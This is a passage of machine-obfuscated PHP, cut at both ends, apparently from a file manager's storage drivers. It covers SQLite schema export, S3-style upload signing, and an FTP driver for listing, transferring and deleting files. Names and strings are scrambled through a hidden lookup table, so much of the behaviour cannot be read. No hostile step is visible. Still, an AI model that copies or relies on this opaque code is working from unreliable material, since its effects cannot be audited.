$Ğ™èë[$éÊÑ¿ñÛ[1197]] == $éÊÑ¿ñÛ[971] ? $éÊÑ¿ñÛ[1198] : $éÊÑ¿ñÛ[1199], $Ğ™èë[$éÊÑ¿ñÛ[1194]] == $ÁĞ´•ßÉ ? $éÊÑ¿ñÛ[1200] : $éÊÑ¿ñÛ[12], $Ğ™èë[$éÊÑ¿ñÛ[1022]] ? strtoupper(str_replace($éÊÑ¿ñÛ[11], $éÊÑ¿ñÛ[12], $Ğ™èë[$éÊÑ¿ñÛ[1022]])) : $éÊÑ¿ñÛ[12]); $µÃÔ†şò[] = trim(implode($éÊÑ¿ñÛ[53], $—Ô½ı«€)); } $õˆ¯ƒèü = array($éÊÑ¿ñÛ[1201] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[1202], $éÊÑ¿ñÛ[1203] . $£¥¯ÁÌ . $éÊÑ¿ñÛ[1204], implode($éÊÑ¿ñÛ[50] . PHP_EOL, $µÃÔ†şò), $éÊÑ¿ñÛ[1019]); $·ı³ã°Ñ = implode(PHP_EOL, array_merge($õˆ¯ƒèü, $Ï¥û€È˜)); if ($Ø¬×ò®‚ && $Ø¬×ò®‚ == $éÊÑ¿ñÛ[13]) { return $·ı³ã°Ñ; } $œòğ¢¡ù = array($éÊÑ¿ñÛ[878] => $ãêáøàŸ, $éÊÑ¿ñÛ[13] => $·ı³ã°Ñ); return $Ø¬×ò®‚ ? $œòğ¢¡ù[$Ø¬×ò®‚] : $œòğ¢¡ù; } public function sqlFromSqlite($ÇÊÉò“¾, $‹´ÆÔĞ‘ = '') { $ıØéº™¨ =& $_SERVER[Ò°Ì”İ•]; $³Õõó€ = $this->model()->db(); $ÖÜº‡â¨ = "\x50\122\x41\x47\115\101\x20\x54\101\102\x4c\105\137\x49\116\106\x4f\40\50\47{$ÇÊÉò“¾}\x27\x29"; $‰ü—ò®Ğ = "\x53\x45\x4c\105\x43\124\40\52\40\106\x52\x4f\115\x20\x73\x71\x6c\x69\x74\x65\x5f\x6d\x61\x73\x74\145\x72\40\x57\x48\105\122\105\40\164\x62\x6c\137\156\x61\155\x65\x20\x3d\40\x27{$ÇÊÉò“¾}\x27"; $ó…€‚Á§ = $³Õõó€->query($ÖÜº‡â¨); if (empty($ó…€‚Á§)) { $ÎçÍŠÛ« = array($ıØéº™¨[878] => $ıØéº™¨[12], $ıØéº™¨[13] => $ıØéº™¨[12]); return $‹´ÆÔĞ‘ ? $ÎçÍŠÛ«[$‹´ÆÔĞ‘] : $ÎçÍŠÛ«; } $¡Á†ÖšÉ = $³Õõó€->query($‰ü—ò®Ğ); $˜ëÍÆ¼ = $Ö™­›Ëş = array(); foreach ($¡Á†ÖšÉ as $È†ÕÆ§Õ) { if ($È†ÕÆ§Õ[$ıØéº™¨[33]] == $ıØéº™¨[368]) { $˜ëÍÆ¼[] = $È†ÕÆ§Õ[$ıØéº™¨[1205]]; } else { $Ö™­›Ëş[$È†ÕÆ§Õ[$ıØéº™¨[32]]] = $È†ÕÆ§Õ[$ıØéº™¨[1205]]; } } $ş—…Ú±§ = array_merge(array($ıØéº™¨[1201] . $ÇÊÉò“¾ . $ıØéº™¨[132]), $˜ëÍÆ¼, array_values($Ö™­›Ëş)); $ş—…Ú±§ = implode($ıØéº™¨[85] . PHP_EOL, $ş—…Ú±§) . $ıØéº™¨[85]; if ($‹´ÆÔĞ‘ && $‹´ÆÔĞ‘ == $ıØéº™¨[13]) { return $ş—…Ú±§; } $Û”êŞæ = array(); foreach ($Ö™­›Ëş as $ãÏ¶“ò => $ë±¶×ı×) { $ö»Æ¯ŞÇ = str_replace($ıØéº™¨[1206] . $ÇÊÉò“¾ . $ıØéº™¨[11], $ıØéº™¨[12], $ãÏ¶“ò); $ö»Æ¯ŞÇ = str_replace($ÇÊÉò“¾ . $ıØéº™¨[11], $ıØéº™¨[12], $ãÏ¶“ò); $ßãåğı¡ = str_replace(array($ıØéº™¨[132], $ıØéº™¨[1030]), $ıØéº™¨[473], substr($ë±¶×ı×, stripos($ë±¶×ı×, $ıØéº™¨[349]))); $Û”êŞæ[$ö»Æ¯ŞÇ] = $ßãåğı¡; } $¸’ü¼± = array(); $«âß™Ëõ = array($ıØéº™¨[1193] => $ıØéº™¨[1207], $ıØéº™¨[402] => $ıØéº™¨[1208]); $­©«üë = $Éìí•Ú = $ıØéº™¨[12]; foreach ($ó…€‚Á§ as $È†ÕÆ§Õ) { if ($È†ÕÆ§Õ[$ıØéº™¨[67]] == $ıØéº™¨[102]) { $­©«üë = $È†ÕÆ§Õ[$ıØéº™¨[32]]; } $ß…Û·¹Ã = $È†ÕÆ§Õ[$ıØéº™¨[33]]; if ($ß…Û·¹Ã == $ıØéº™¨[1209] && isset($Û”êŞæ[$È†ÕÆ§Õ[$ıØéº™¨[32]]])) { $ß…Û·¹Ã = $ıØéº™¨[1210]; } $†—ÉûŸ“ = array($ıØéº™¨[473] . $È†ÕÆ§Õ[$ıØéº™¨[32]] . $ıØéº™¨[473], _get($«âß™Ëõ, $ß…Û·¹Ã, $ß…Û·¹Ã), $È†ÕÆ§Õ[$ıØéº™¨[35]] == $ıØéº™¨[102] ? $ıØéº™¨[1198] : $ıØéº™¨[1211] . $È†ÕÆ§Õ[$ıØéº™¨[66]], $È†ÕÆ§Õ[$ıØéº™¨[67]] == $ıØéº™¨[102] ? $ıØéº™¨[1212] : $ıØéº™¨[12]); $¸’ü¼±[] = trim(implode($ıØéº™¨[53], $†—ÉûŸ“)); } foreach ($Û”êŞæ as $ö»Æ¯ŞÇ => $ßãåğı¡) { if ($ö»Æ¯ŞÇ == $ıØéº™¨[1187]) { $¥¦´é‘ = $Éìí•Ú = $ıØéº™¨[1213] . $­©«üë . $ıØéº™¨[1214]; } else { $¥¦´é‘ = (stripos($ö»Æ¯ŞÇ, $ıØéº™¨[11]) ? $ıØéº™¨[1215] : $ıØéº™¨[12]) . ($ıØéº™¨[1216] . $ö»Æ¯ŞÇ . $ıØéº™¨[1217] . $ßãåğı¡); } $¸’ü¼±[] = $¥¦´é‘; } if ($­©«üë && !$Éìí•Ú) { $¸’ü¼± = array_merge(array($ıØéº™¨[1213] . $­©«üë . $ıØéº™¨[1214]), $¸’ü¼±); } $–Õ°•çÖ = array($ıØéº™¨[1218] . $ÇÊÉò“¾ . $ıØéº™¨[1219], $ıØéº™¨[1220] . $ÇÊÉò“¾ . $ıØéº™¨[1221], implode($ıØéº™¨[50] . PHP_EOL, $¸’ü¼±), $ıØéº™¨[1222]); $å÷ÛÈá = implode(PHP_EOL, $–Õ°•çÖ); if ($‹´ÆÔĞ‘ && $‹´ÆÔĞ‘ == $ıØéº™¨[878]) { return $å÷ÛÈá; } $ÎçÍŠÛ« = array($ıØéº™¨[878] => $å÷ÛÈá, $ıØéº™¨[13] => $ş—…Ú±§); return $‹´ÆÔĞ‘ ? $ÎçÍŠÛ«[$‹´ÆÔĞ‘] : $ÎçÍŠÛ«; } } goto Bëä›×±”; B±Œ‘¸ÚŸ—: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($’Ëô…ä€) { parent::__construct($’Ëô…ä€); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } public function uploadFormData($ÅÑÑÌ ¸, $ÒˆùÚÉÂ = 3600) { $ É·Çİ˜ =& $_SERVER[Ò°Ì”İ•]; $ÖŞã«ÁÅ = $ É·Çİ˜[242]; $×“ÁÉ¡ = $ É·Çİ˜[270]; $÷¨Ìü´Ù = $ É·Çİ˜[73]; $í®²ÊìŸ = gmdate($ É·Çİ˜[271]); $«¾ê¾Ú = gmdate($ É·Çİ˜[272]); $¶Ñ‹ı©Í = $ É·Çİ˜[273]; $é¤ÂÂ¾ = $ÒˆùÚÉÂ . $ É·Çİ˜[12]; $‘Ãå¬Ü = $ É·Çİ˜[274]; $ÖŠ©÷æá = array($this->accessKey, $«¾ê¾Ú, $this->region, $÷¨Ìü´Ù, $¶Ñ‹ı©Í); $±Ûşúğ = implode($ É·Çİ˜[8], $ÖŠ©÷æá); $àò‹à = array($ É·Çİ˜[275] => gmdate($ É·Çİ˜[1409], strtotime($ É·Çİ˜[277])), $ É·Çİ˜[278] => array(array($ É·Çİ˜[279] => $this->bucket), array($ É·Çİ˜[318] => $ÖŞã«ÁÅ), array($ É·Çİ˜[280], $ É·Çİ˜[281], $ É·Çİ˜[12]), array($ É·Çİ˜[280], $ É·Çİ˜[282], $ É·Çİ˜[12]), array($ É·Çİ˜[280], $ É·Çİ˜[319], $ É·Çİ˜[12]), array($ É·Çİ˜[283] => $‘Ãå¬Ü), array($ É·Çİ˜[284] => $±Ûşúğ), array($ É·Çİ˜[285] => $×“ÁÉ¡), array($ É·Çİ˜[286] => $í®²ÊìŸ), array($ É·Çİ˜[287] => $é¤ÂÂ¾))); $´ªª¬ = base64_encode(json_encode($àò‹à)); $„Æ…£Ï— = hash_hmac($ É·Çİ˜[288], $«¾ê¾Ú, $ É·Çİ˜[289] . $this->secret, !0); $à£Ê†ÈÊ = hash_hmac($ É·Çİ˜[288], $this->region, $„Æ…£Ï—, !0); $Å¨‹ù‚› = hash_hmac($ É·Çİ˜[288], $÷¨Ìü´Ù, $à£Ê†ÈÊ, !0); $”¹À¶ˆŞ = hash_hmac($ É·Çİ˜[288], $¶Ñ‹ı©Í, $Å¨‹ù‚›, !0); $¢ÛÂ‰‘À = hash_hmac($ É·Çİ˜[288], $´ªª¬, $”¹À¶ˆŞ); $Ş¿ÊÆñõ = array($ É·Çİ˜[259] => $ É·Çİ˜[12], $ É·Çİ˜[306] => $ É·Çİ˜[12], $ É·Çİ˜[318] => $ÖŞã«ÁÅ, $ É·Çİ˜[283] => $‘Ãå¬Ü, $ É·Çİ˜[290] => $´ªª¬, $ É·Çİ˜[320] => $±Ûşúğ, $ É·Çİ˜[321] => $×“ÁÉ¡, $ É·Çİ˜[322] => $í®²ÊìŸ, $ É·Çİ˜[323] => $é¤ÂÂ¾, $ É·Çİ˜[324] => $¢ÛÂ‰‘À, $ É·Çİ˜[219] => $this->getHost()); return $Ş¿ÊÆñõ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ÉõÇ×¾) { parent::__construct(); if (count($ÉõÇ×¾) > 0) { $this->_init($ÉõÇ×¾); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ñö‚±ƒ) { $ÒèÍŒ§¢ =& $_SERVER[Ò°Ì”İ•]; global $config; $this->appCharset = $config[$ÒèÍŒ§¢[1435]]; $this->systemCharset = $config[$ÒèÍŒ§¢[1436]]; if (isset($Ñö‚±ƒ[$ÒèÍŒ§¢[1437]]) && $Ñö‚±ƒ[$ÒèÍŒ§¢[1437]]) { $this->systemCharset = $Ñö‚±ƒ[$ÒèÍŒ§¢[1437]]; } } public function iconvApp($ãä„Æîî) { return $this->iconvTo($ãä„Æîî, $this->systemCharset, $this->appCharset); } public function iconvSystem($êï¢òÕ) { return $this->iconvTo($êï¢òÕ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ó¾ë¹òÅ) { $·€ü£˜Ã =& $_SERVER[Ò°Ì”İ•]; $ûÑùº‰ = $this->iconvApp($this->pathBase); $Ó¾ë¹òÅ = $this->iconvApp($Ó¾ë¹òÅ); if (substr($ûÑùº‰, 0, 2) == $·€ü£˜Ã[1407]) { $ûÑùº‰ = BASIC_PATH . substr($ûÑùº‰, 2); } if (substr($Ó¾ë¹òÅ, 0, 2) == $·€ü£˜Ã[1407]) { $Ó¾ë¹òÅ = BASIC_PATH . substr($Ó¾ë¹òÅ, 2); } $ûÑùº‰ = KodIO::clear($ûÑùº‰); $Ó¾ë¹òÅ = KodIO::clear($Ó¾ë¹òÅ); $Ó¾ë¹òÅ = substr($Ó¾ë¹òÅ, strlen($ûÑùº‰)); if (empty($this->pathDriver)) { return $Ó¾ë¹òÅ; } return $this->pathDriver . $·€ü£˜Ã[8] . ltrim($Ó¾ë¹òÅ, $·€ü£˜Ã[8]); } private function _init($Ä°àÜÊé = array()) { $ÌÈææÈÎ =& $_SERVER[Ò°Ì”İ•]; if (!function_exists($ÌÈææÈÎ[1438])) { throw new Exception(LNG($ÌÈææÈÎ[1439])); } $this->config = $Ä°àÜÊé; $this->charsetReset($Ä°àÜÊé); foreach ($Ä°àÜÊé as $±ÜéÛ³¶ => $ÚìÄøàì) { if (isset($this->{$±ÜéÛ³¶})) { $this->{$±ÜéÛ³¶} = $ÚìÄøàì; } } return $this->_login($Ä°àÜÊé); } private function _login($õ´çüüÀ) { $ÔÜ‡‘¾Ş =& $_SERVER[Ò°Ì”İ•]; static $¶Ó£€–û = array(); $öı—¢²ä = md5(json_encode($õ´çüüÀ)); if (isset($¶Ó£€–û[$öı—¢²ä])) { foreach ($¶Ó£€–û[$öı—¢²ä] as $½¼¶¿¡ => $È‰ìŸ§) { $this->{$½¼¶¿¡} = $È‰ìŸ§; } return !0; } $—òˆÙ¶‘ = parse_url(trim($this->server, $ÔÜ‡‘¾Ş[8])); $this->host = $—òˆÙ¶‘[$ÔÜ‡‘¾Ş[219]]; $ÅêˆÚæò = isset($—òˆÙ¶‘[$ÔÜ‡‘¾Ş[218]]) && $—òˆÙ¶‘[$ÔÜ‡‘¾Ş[218]] == $ÔÜ‡‘¾Ş[1440] ? !0 : !1; $this->scheme = $ÅêˆÚæò ? $ÔÜ‡‘¾Ş[1441] : $ÔÜ‡‘¾Ş[1442]; $this->port = isset($—òˆÙ¶‘[$ÔÜ‡‘¾Ş[220]]) ? $—òˆÙ¶‘[$ÔÜ‡‘¾Ş[220]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ÔÜ‡‘¾Ş[1443]) . $this->host . $ÔÜ‡‘¾Ş[4] . $this->port, !0); return !1; } $çªİøÂ“ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$çªİøÂ“) { $this->writeLog(LNG($ÔÜ‡‘¾Ş[1444]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ëà–íûõ = $this->pasv == $ÔÜ‡‘¾Ş[102] ? !0 : !1; @ftp_pasv($this->connect, $ëà–íûõ); $¶Ó£€–û[$öı—¢²ä] = array($ÔÜ‡‘¾Ş[1445] => $this->connect, $ÔÜ‡‘¾Ş[219] => $this->host, $ÔÜ‡‘¾Ş[218] => $this->scheme, $ÔÜ‡‘¾Ş[220] => $this->port); return $çªİøÂ“; } private function _isconn($ß‡†à¦ú = true) { if (is_resource($this->connect)) { return !0; } if (!$ß‡†à¦ú) { return !1; } return $this->_login($this->config); } public function mkfile($Ñ ğÍ‘, $Òäñ€¼± = '', $‹‘ÛšÀö = REPEAT_RENAME) { if ($this->setContent($Ñ ğÍ‘, $Òäñ€¼±)) { return $this->getPathOuter($Ñ ğÍ‘); } $this->writeLog(LNG($_SERVER[Ò°Ì”İ•][1446]), !0); return !1; } public function mkdir($Ë¥‘Á¶, $™¬Õüµ = REPEAT_SKIP) { $µü»îö÷ =& $_SERVER[Ò°Ì”İ•]; if (!$Ë¥‘Á¶ || $Ë¥‘Á¶ == $µü»îö÷[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ë¥‘Á¶ = $this->iconvSystem($Ë¥‘Á¶); if ($this->_isFolder($Ë¥‘Á¶) || @ftp_mkdir($this->connect, $Ë¥‘Á¶)) { return $this->getPathOuter($Ë¥‘Á¶); } if (!$this->mkdir($this->pathFather($Ë¥‘Á¶))) { return !1; } if ($Ë¥‘Á¶ = @ftp_mkdir($this->connect, $Ë¥‘Á¶)) { return $this->getPathOuter($Ë¥‘Á¶); } $this->writeLog(__FUNCTION__ . $µü»îö÷[1447], !0); return !1; } public function copyFile($Ê¢àÂçÇ, $ÏâÖëçĞ) { if (!$this->_isconn()) { return !1; } $ê¯ü©Ë = $this->pathThis($this->iconvSystem($Ê¢àÂçÇ)); $àñË”ß© = $this->tempFile($ê¯ü©Ë); $…£Õñ©” = $this->iconvApp($àñË”ß©); $this->download($Ê¢àÂçÇ, $…£Õñ©”); $çŒÎ‰ú = $this->upload($ÏâÖëçĞ, $…£Õñ©”); $this->tempFileRemve($àñË”ß©); return $çŒÎ‰ú; } public function moveFile($Ÿ‰ÂÍÌç, $¶öá„ò†) { if (!$this->_isconn()) { return !1; } $Ÿ‰ÂÍÌç = $this->iconvSystem($Ÿ‰ÂÍÌç); $¶öá„ò† = $this->iconvSystem($¶öá„ò†); $Ş•ÈÕ‰ = @ftp_rename($this->connect, $Ÿ‰ÂÍÌç, $¶öá„ò†); if (!$Ş•ÈÕ‰) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } return $this->getPathOuter($¶öá„ò†); } public function delFile($ùÖÂúéŠ) { if (!$this->_isconn()) { return !1; } $ùÖÂúéŠ = $this->iconvSystem($ùÖÂúéŠ); $œä‹ğ¬® = @ftp_delete($this->connect, $ùÖÂúéŠ); if (!$œä‹ğ¬®) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); } return $œä‹ğ¬®; } public function delFolder($ÛÈâ®°) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¥êÀ¿”ë = $û´Ÿí°® = array(); $this->fileList($ÛÈâ®°, $¥êÀ¿”ë, $û´Ÿí°®, !0); $this->listItemCache = !0; foreach ($û´Ÿí°® as $¢¿à¸•²) { $´ƒ¶›ÉÈ = $this->iconvSystem($¢¿à¸•²[$_SERVER[Ò°Ì”İ•][32]]); $œœ¹ä¨ˆ = @ftp_delete($this->connect, $´ƒ¶›ÉÈ); if (!$œœ¹ä¨ˆ) { return !1; } } foreach ($¥êÀ¿”ë as $´ƒ¶›ÉÈ) { $´ƒ¶›ÉÈ = $this->iconvSystem($´ƒ¶›ÉÈ); $œœ¹ä¨ˆ = @ftp_rmdir($this->connect, $´ƒ¶›ÉÈ); if (!$œœ¹ä¨ˆ) { return !1; } } $ÛÈâ®° = $this->iconvSystem($ÛÈâ®°); return @ftp_rmdir($this->connect, $ÛÈâ®°); } public function rename($ŸÒ·Åƒ³, $‘‰–Ô†÷) { $¥û­ûÕÜ =& $_SERVER[Ò°Ì”İ•]; if (!$this->_isconn()) { return !1; } $›Ã…Šëì = $this->fileNameAuto($this->pathFather($ŸÒ·Åƒ³), $‘‰–Ô†÷); $›Ã…Šëì = $this->iconvSystem($›Ã…Šëì); $ŸÒ·Åƒ³ = $this->iconvSystem($ŸÒ·Åƒ³); $æ›æá­Ì = $this->pathFather($ŸÒ·Åƒ³); $äıùêš = rtrim($æ›æá­Ì, $¥û­ûÕÜ[8]) . $¥û­ûÕÜ[8] . $›Ã…Šëì; $óşÉ¦ù” = @ftp_rename($this->connect, $ŸÒ·Åƒ³, $äıùêš); if (!$óşÉ¦ù”) { $this->writeLog(__FUNCTION__ . $¥û­ûÕÜ[1447], !0); return !1; } $äıùêš = $this->iconvApp($äıùêš); return $this->getPathOuter($äıùêš); } private function folderInfo($Ëøì±ñ, $İ’÷´· = false) { $‚Ö‡°† =& $_SERVER[Ò°Ì”İ•]; $‚É½Ãº’ = array($‚Ö‡°†[32] => $this->pathThis($Ëøì±ñ), $‚Ö‡°†[98] => $this->getPathOuter($‚Ö‡°†[8] . $Ëøì±ñ), $‚Ö‡°†[33] => $‚Ö‡°†[89]); if ($İ’÷´·) { return $‚É½Ãº’; } $‚É½Ãº’[$‚Ö‡°†[244]] = $‚É½Ãº’[$‚Ö‡°†[99]] = 0; $‚É½Ãº’[$‚Ö‡°†[245]] = $‚É½Ãº’[$‚Ö‡°†[246]] = !0; return $‚É½Ãº’; } private function fileInfo($ß±¡€Â›, $ıêÆ¨ªÛ = false, $ûÅ´¶ÈÂ = array()) { $ŠÁ–´½Å =& $_SERVER[Ò°Ì”İ•]; $ºË¨²¾¥ = array($ŠÁ–´½Å[32] => $this->pathThis($ß±¡€Â›), $ŠÁ–´½Å[98] => $this->getPathOuter($ŠÁ–´½Å[8] . $ß±¡€Â›), $ŠÁ–´½Å[33] => $ŠÁ–´½Å[243], $ŠÁ–´½Å[90] => isset($ûÅ´¶ÈÂ[$ŠÁ–´½Å[90]]) ? $ûÅ´¶ÈÂ[$ŠÁ–´½Å[90]] : 0, $ŠÁ–´½Å[180] => $this->ext($ß±¡€Â›)); if ($ıêÆ¨ªÛ) { return $ºË¨²¾¥; } $ºË¨²¾¥[$ŠÁ–´½Å[244]] = $ºË¨²¾¥[$ŠÁ–´½Å[99]] = 0; $ºË¨²¾¥[$ŠÁ–´½Å[245]] = $ºË¨²¾¥[$ŠÁ–´½Å[246]] = !0; $Àò…‹Â = $this->iconvSystem($ß±¡€Â›); $ºË¨²¾¥[$ŠÁ–´½Å[99]] = @ftp_mdtm($this->connect, $Àò…‹Â); if (empty($ûÅ´¶ÈÂ)) { $ûÅ´¶ÈÂ = $this->objectMeta($ß±¡€Â›); if (!$ûÅ´¶ÈÂ) { return $ºË¨²¾¥; } } $ºË¨²¾¥[$ŠÁ–´½Å[90]] = $ûÅ´¶ÈÂ[$ŠÁ–´½Å[90]]; return $ºË¨²¾¥; } public function size($†î°§¿«) { $Ğ–¯Õœß = $this->objectMeta($†î°§¿«); return $Ğ–¯Õœß ? $Ğ–¯Õœß[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function info($ğ®ş“¬®) { if ($this->isFile($ğ®ş“¬®)) { return $this->fileInfo($ğ®ş“¬®, 0); } else { if ($this->isFolder($ğ®ş“¬®)) { return $this->folderInfo($ğ®ş“¬®); } } return !1; } private function fileList($ÊéØÈ³, &$®“‰­¹ü, &$İ¤ş£¢Ñ, $Ú”úØ¿‚ = false) { $ÒØÂ¬Ö =& $_SERVER[Ò°Ì”İ•]; $ÊéØÈ³ = $this->iconvSystem($ÊéØÈ³); if (!$this->isFolder($ÊéØÈ³)) { return !1; } @ftp_chdir($this->connect, $ÒØÂ¬Ö[8]); $ÊéØÈ³ = rtrim($ÊéØÈ³, $ÒØÂ¬Ö[8]) . $ÒØÂ¬Ö[8]; check_abort(); $ŠÂ¥Ïêª = @ftp_rawlist($this->connect, $ÊéØÈ³); if (!$ŠÂ¥Ïêª) { $ŠÂ¥Ïêª = array(); } $üÜƒõ™– = array($ÒØÂ¬Ö[10] => 1, $ÒØÂ¬Ö[1359] => 1); foreach ($ŠÂ¥Ïêª as $èİŒóñ) { $äÏ’¤¯÷ = $this->_listItem($èİŒóñ); if ($äÏ’¤¯÷[0] == $ÒØÂ¬Ö[831]) { continue; } $¬İ¹†¥ = $äÏ’¤¯÷[8]; if (empty($¬İ¹†¥) && $¬İ¹†¥ !== $ÒØÂ¬Ö[241] || isset($üÜƒõ™–[$¬İ¹†¥])) { continue; } $¬İ¹†¥ = $this->iconvApp($ÊéØÈ³ . ltrim($¬İ¹†¥, $ÒØÂ¬Ö[8])); $İÑÎĞ« = array($ÒØÂ¬Ö[32] => $¬İ¹†¥, $ÒØÂ¬Ö[33] => $ÒØÂ¬Ö[243], $ÒØÂ¬Ö[90] => $äÏ’¤¯÷[4]); if (substr($èİŒóñ, 0, 1) == $ÒØÂ¬Ö[1448]) { $İÑÎĞ«[$ÒØÂ¬Ö[33]] = $ÒØÂ¬Ö[89]; $İÑÎĞ«[$ÒØÂ¬Ö[90]] = 0; } $Ë¹¯Âôœ = $İÑÎĞ«[$ÒØÂ¬Ö[33]] == $ÒØÂ¬Ö[89] ? !0 : !1; $this->cacheMethodInfoSet($¬İ¹†¥, $Ë¹¯Âôœ, $İÑÎĞ«); if ($Ë¹¯Âôœ) { $®“‰­¹ü[] = $¬İ¹†¥; if ($Ú”úØ¿‚) { $this->fileList($¬İ¹†¥, $®“‰­¹ü, $İ¤ş£¢Ñ, $Ú”úØ¿‚); } continue; } $İ¤ş£¢Ñ[] = $İÑÎĞ«; } $this->cacheMethodInfoSet($ÊéØÈ³, !0); } private function _listItem($áúà¬) { if (empty($áúà¬)) { return array(); } $«ûÂòïµ = preg_split($_SERVER[Ò°Ì”İ•][1449], $áúà¬); if (count($«ûÂòïµ) <= 9) { return $«ûÂòïµ; } $«ûÂòïµ[8] = trim(substr($áúà¬, strpos($áúà¬, $«ûÂòïµ[7]) + strlen($«ûÂòïµ[7]))); return array_splice($«ûÂòïµ, 0, 9); } public function listPath($‚¤ÖÒÑ¯, $ëâÆºàö = false) { $à×ùí© =& $_SERVER[Ò°Ì”İ•]; if (!$this->_isconn()) { return !1; } $›ãÊÎª‚ = $³¥Ã÷öº = array(); $this->fileList($‚¤ÖÒÑ¯, $›ãÊÎª‚, $³¥Ã÷öº); foreach ($›ãÊÎª‚ as $¤¦÷–ù => $šÕ‘°éş) { $›ãÊÎª‚[$¤¦÷–ù] = $this->folderInfo($šÕ‘°éş, $ëâÆºàö); } foreach ($³¥Ã÷öº as $¤¦÷–ù => $šÕ‘°éş) { $³¥Ã÷öº[$¤¦÷–ù] = $this->fileInfo($šÕ‘°éş[$à×ùí©[32]], $ëâÆºàö, $šÕ‘°éş); } return array($à×ùí©[96] => $›ãÊÎª‚, $à×ùí©[97] => $³¥Ã÷öº); } public function has($¼á‘Ø…‹, $“×—é¢Í = false, $ÛÂ×˜Î– = true) { $ƒµÊŞÅï =& $_SERVER[Ò°Ì”İ•]; $·øúâÊé = $Ëõ›ëüÄ = array(); $Çµšôñû = $“×—é¢Í ? !0 : !1; $this->fileList($¼á‘Ø…‹, $·øúâÊé, $Ëõ›ëüÄ, $Çµšôñû); if ($“×—é¢Í) { return array($ƒµÊŞÅï[252] => count($Ëõ›ëüÄ), $ƒµÊŞÅï[253] => count($·øúâÊé)); } if ($ÛÂ×˜Î–) { if (count($Ëõ›ëüÄ)) { return !0; } } else { if (count($·øúâÊé)) { return !0; } } return !1; } public function listAll($÷Í¢Ó¯) { $ê¥Ö×“š =& $_SERVER[Ò°Ì”İ•]; if (!$this->_isconn()) { return !1; } $†«½ù…Í = $µÑîô— = array(); $this->fileList($÷Í¢Ó¯, $†«½ù…Í, $µÑîô—, !0); $¶ŞÖ‡üè = array_to_keyvalue($µÑîô—, $ê¥Ö×“š[32]); foreach ($†«½ù…Í as $ÍôÄ™ÊĞ) { if (is_string($ÍôÄ™ÊĞ)) { $¶ŞÖ‡üè[$ÍôÄ™ÊĞ] = array($ê¥Ö×“š[90] => 0); } } return $this->listAllFiles($÷Í¢Ó¯, $¶ŞÖ‡üè); } public function getContent($†›‡ƒíœ) { if (!$this->_isconn()) { return !1; } $†›‡ƒíœ = $this->iconvSystem($†›‡ƒíœ); return $this->fileSubstr($†›‡ƒíœ); } public function setContent($äÅ‰ş¹È, $—µ–Æ¼Ê = '') { if (!$this->_isconn()) { return !1; } $ˆ¤ÍŸŞ‹ = $this->pathThis($this->iconvSystem($äÅ‰ş¹È)); $Áó«æÜ = $this->tempFile($ˆ¤ÍŸŞ‹); file_put_contents($Áó«æÜ, $—µ–Æ¼Ê); $¤ÛÒÖóü = $this->upload($äÅ‰ş¹È, $this->iconvApp($Áó«æÜ)); $this->tempFileRemve($Áó«æÜ); return $¤ÛÒÖóü; } public function fileSubstr($è‡Éíœ», $îÁïÂ…” = 0, $¤›Œ¿ñú = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($è‡Éíœ», $îÁïÂ…”, $¤›Œ¿ñú); } private function ftpRequest($ ˜œ®Œî, $ªËµ°¿Õ = 0, $¦Ñæ¨ú = false) { $ ˜œ®Œî = $this->iconvSystem($ ˜œ®Œî); $Á“Âı¹Ï = $this->scheme . $this->host . $_SERVER[Ò°Ì”İ•][4] . $this->port; $ÄâÇÀ¤¢ = curl_init(); curl_setopt($ÄâÇÀ¤¢, CURLOPT_URL, $Á“Âı¹Ï . $this->pathEncode($ ˜œ®Œî)); curl_setopt($ÄâÇÀ¤¢, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¦Ñæ¨ú) { $úÓì‡ˆÑ = $ªËµ°¿Õ + $¦Ñæ¨ú - 1; curl_setopt($ÄâÇÀ¤¢, CURLOPT_RANGE, "{$ªËµ°¿Õ}\55{$úÓì‡ˆÑ}"); } curl_setopt($ÄâÇÀ¤¢, CURLOPT_RETURNTRANSFER, 1); $Ğ¢‘†”¨ = curl_exec($ÄâÇÀ¤¢); curl_close($ÄâÇÀ¤¢); return $Ğ¢‘†”¨; } public function upload($ïåó¢¯Û, $óÉ°ˆ­¤, $ ½ÀÕ·× = false, $¨üâïî = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ïåó¢¯Û))) { return !1; } $ïåó¢¯Û = $this->iconvSystem($ïåó¢¯Û); $óÉ°ˆ­¤ = $this->iconvSystem($óÉ°ˆ­¤); $»¨Ú”î¶ = ftp_nb_put($this->connect, $ïåó¢¯Û, $óÉ°ˆ­¤, FTP_BINARY); while ($»¨Ú”î¶ == FTP_MOREDATA) { $»¨Ú”î¶ = ftp_nb_continue($this->connect); } if ($»¨Ú”î¶ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } return $this->getPathOuter($ïåó¢¯Û); } public function download($¤¹ô¸¶ş, $ßòŠº–Ğ = '') { if (!$this->_isconn()) { return !1; } $—İ¡úœÀ = $this->pathFather($ßòŠº–Ğ); if (!IO::mkdir($—İ¡úœÀ)) { return !1; } $¤¹ô¸¶ş = $this->iconvSystem($¤¹ô¸¶ş); $ßòŠº–Ğ = $this->iconvSystem($ßòŠº–Ğ); $±‡¬Ê¤š = ftp_nb_get($this->connect, $ßòŠº–Ğ, $¤¹ô¸¶ş, FTP_BINARY); while ($±‡¬Ê¤š == 